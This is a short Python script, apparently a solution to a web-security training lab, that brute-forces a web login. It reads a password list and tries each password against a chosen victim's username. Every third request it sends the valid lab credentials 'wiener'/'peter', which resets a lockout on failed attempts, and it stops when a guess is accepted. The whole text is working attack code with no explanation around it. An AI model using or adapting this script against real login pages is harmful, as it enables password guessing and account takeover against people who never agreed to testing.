#!/usr/bin/env python3
import sys

import requests

# URL = sys.argv[1]
URL = input("Enter target url: ")
victim = input("Enter victim's username: ")
with open("passwords.txt") as file:
    passwords = file.read()
    pass_list = passwords.split()

pass_num = 0

for j in range(1, 150):
    if j % 3 == 0:
        data = {"username": "wiener", "password": "peter"}
        response = requests.post(url=URL, data=data, timeout=3)
        print("[+] Providing valid creds...")
    else:
        data = {"username": victim, "password": pass_list[pass_num]}
        response = requests.post(url=URL, data=data, timeout=3)
        if "Incorrect password" not in response.text:
            print(f"[💥] Valid password found: {pass_list[pass_num]}")
            break
        else:
            print(f"[-] Trying {pass_list[pass_num]}")
            pass_num += 1



